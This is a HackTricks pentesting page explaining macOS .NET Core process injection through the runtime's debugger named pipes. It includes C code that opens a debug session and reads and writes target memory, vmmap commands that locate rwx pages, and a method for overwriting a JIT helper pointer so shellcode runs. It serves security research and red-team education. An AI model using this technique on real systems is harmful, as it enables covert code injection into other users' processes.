# macOS .Net Applications Injection

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## .NET Core Debugging <a href="#net-core-debugging" id="net-core-debugging"></a>

### **Stablish a debugging session** <a href="#net-core-debugging" id="net-core-debugging"></a>

[**dbgtransportsession.cpp**](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp) is responsible for handling debugger to debugee **communication**.\
It creates a 2 of names pipes per .Net process in [dbgtransportsession.cpp#L127](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp#L127) by calling [twowaypipe.cpp#L27](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/debug-pal/unix/twowaypipe.cpp#L27) (one will end in **`-in`** and the other in **`-out`** and the rest of the name will be the same).

So, if you go to the users **`$TMPDIR`** you will be able to find **debugging fifos** you could use to debug .Net applications:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The function [**DbgTransportSession::TransportWorker**](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp#L1259) will handle the communication from a debugger.

The first thing a debugger is required to do is to **create a new debugging session**. This is done by **sending a message via the `out` pipe** beginning with a `MessageHeader` struct, which we can grab from the .NET source:

```c
struct MessageHeader
{
    MessageType   m_eType;        // Type of message this is
    DWORD         m_cbDataBlock;  // Size of data block that immediately follows this header (can be zero)
    DWORD         m_dwId;         // Message ID assigned by the sender of this message
    DWORD         m_dwReplyId;    // Message ID that this is a reply to (used by messages such as MT_GetDCB)
    DWORD         m_dwLastSeenId; // Message ID last seen by sender (receiver can discard up to here from send queue)
    DWORD         m_dwReserved;   // Reserved for future expansion (must be initialized to zero and
                                            // never read)
        union {
            struct {
                DWORD         m_dwMajorVersion;   // Protocol version requested/accepted
                DWORD         m_dwMinorVersion;
            } VersionInfo;
          ...
        } TypeSpecificData;

    BYTE                    m_sMustBeZero[8];
}
```

In the case of a new session request, this struct is populated as follows:

```c
static const DWORD kCurrentMajorVersion = 2;
static const DWORD kCurrentMinorVersion = 0;

// Set the message type (in this case, we're establishing a session)
sSendHeader.m_eType = MT_SessionRequest;

// Set the version
sSendHeader.TypeSpecificData.VersionInfo.m_dwMajorVersion = kCurrentMajorVersion;
sSendHeader.TypeSpecificData.VersionInfo.m_dwMinorVersion = kCurrentMinorVersion;

// Finally set the number of bytes which follow this header
sSendHeader.m_cbDataBlock = sizeof(SessionRequestData);
```

Once constructed, we **send this over to the target** using the `write` syscall:

```c
write(wr, &sSendHeader, sizeof(MessageHeader));
```

Following our header, we need to send over a `sessionRequestData` struct, which contains a GUID to identify our session:

```c
// All '9' is a GUID.. right??
memset(&sDataBlock.m_sSessionID, 9, sizeof(SessionRequestData));

// Send over the session request data
write(wr, &sDataBlock, sizeof(SessionRequestData));
```

Upon sending over our session request, we **read from the `out` pipe a header** that will indicate **if** our request to establish whether a debugger session has been **successful** or not:

```c
read(rd, &sReceiveHeader, sizeof(MessageHeader));
```

### Read Memory

With a debugging sessions stablished it's possible to **read memory** using the message type [`MT_ReadMemory`](https://github.com/dotnet/runtime/blob/f3a45a91441cf938765bafc795cbf4885cad8800/src/coreclr/src/debug/shared/dbgtransportsession.cpp#L1896). To read some memory the main code needed would be:

```c
bool readMemory(void *addr, int len, unsigned char **output) {

    *output = (unsigned char *)malloc(len);
    if (*output == NULL) {
        return false;
    }

    sSendHeader.m_dwId++; // We increment this for each request
    sSendHeader.m_dwLastSeenId = sReceiveHeader.m_dwId; // This needs to be set to the ID of our previous response
    sSendHeader.m_dwReplyId = sReceiveHeader.m_dwId; // Similar to above, this indicates which ID we are responding to
    sSendHeader.m_eType = MT_ReadMemory; // The type of request we are making
    sSendHeader.TypeSpecificData.MemoryAccess.m_pbLeftSideBuffer = (PBYTE)addr; // Address to read from
    sSendHeader.TypeSpecificData.MemoryAccess.m_cbLeftSideBuffer = len; // Number of bytes to write
    sSendHeader.m_cbDataBlock = 0;

    // Write the header
    if (write(wr, &sSendHeader, sizeof(sSendHeader)) < 0) {
        return false;
    }

    // Read the response header
    if (read(rd, &sReceiveHeader, sizeof(sSendHeader)) < 0) {
        return false;
    }

    // Make sure that memory could be read before we attempt to read further
    if (sReceiveHeader.TypeSpecificData.MemoryAccess.m_hrResult != 0) {
        return false;
    }

    memset(*output, 0, len);
    
    // Read the memory from the debugee
    if (read(rd, *output, sReceiveHeader.m_cbDataBlock) < 0) {
        return false;
    }

    return true;
}
```

The proof of concept (POC) code found [here](https://gist.github.com/xpn/95eefc14918998853f6e0ab48d9f7b0b).

### Write memory

```c
bool writeMemory(void *addr, int len, unsigned char *input) {

  sSendHeader.m_dwId++; // We increment this for each request
  sSendHeader.m_dwLastSeenId = sReceiveHeader.m_dwId; // This needs to be set to the ID of our previous response
  sSendHeader.m_dwReplyId = sReceiveHeader.m_dwId; // Similar to above, this indicates which ID we are responding to
  sSendHeader.m_eType = MT_WriteMemory; // The type of request we are making
  sSendHeader.TypeSpecificData.MemoryAccess.m_pbLeftSideBuffer = (PBYTE)addr; // Address to write to
  sSendHeader.TypeSpecificData.MemoryAccess.m_cbLeftSideBuffer = len; // Number of bytes to write
  sSendHeader.m_cbDataBlock = len;

  // Write the header
  if (write(wr, &sSendHeader, sizeof(sSendHeader)) < 0) {
      return false;
  }

  // Write the data
  if (write(wr, input, len) < 0) {
      return false;
  }

  // Read the response header
  if (read(rd, &sReceiveHeader, sizeof(sSendHeader)) < 0) {
      return false;
  }

  // Ensure our memory write was successful
  if (sReceiveHeader.TypeSpecificData.MemoryAccess.m_hrResult != 0) {
      return false;
  }

  return true;

}
```

The POC code used to do this can be found [here](https://gist.github.com/xpn/7c3040a7398808747e158a25745380a5).

### .NET Core Code execution <a href="#net-core-code-execution" id="net-core-code-execution"></a>

The first thing is to identify for example a memory region with **`rwx`** running to save the shellcode to run. This can be easily done with:

```bash
vmmap -pages [pid]
vmmap -pages 35829 | grep "rwx/rwx"
```

Then in order to trigger the execution it would be needed to know some place where a function pointer is stored to overwrite it. It's possible to overwrite a pointer within the **Dynamic Function Table (DFT)**, which is used by the .NET Core runtime to provide helper functions for JIT compilation. A list of supported function pointers can be found within [`jithelpers.h`](https://github.com/dotnet/runtime/blob/6072e4d3a7a2a1493f514cdf4be75a3d56580e84/src/coreclr/src/inc/jithelpers.h).

In x64 versions this is straightforward using the mimikatz-esque **signature hunting** technique to search through **`libcorclr.dll`** for a reference to the symbol **`_hlpDynamicFuncTable`**, which we can dereference:

<figure><img src="../../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

All that is left to do is to find an address from which to start our signature search. To do this, we leverage another exposed debugger function, **`MT_GetDCB`**. This returns a number of useful bits of information on the target process, but for our case, we are interested in a field returned containing the **address of a helper function**, **`m_helperRemoteStartAddr`**. Using this address, we know just **where `libcorclr.dll` is located** within the target process memory and we can start our search for the DFT.

Knowing this address it's possible to overwrite the function pointer with our shellcodes one.

The full POC code used to inject into PowerShell can be found [here](https://gist.github.com/xpn/b427998c8b3924ab1d63c89d273734b6).

## References

* This technique was taken from [https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/](https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
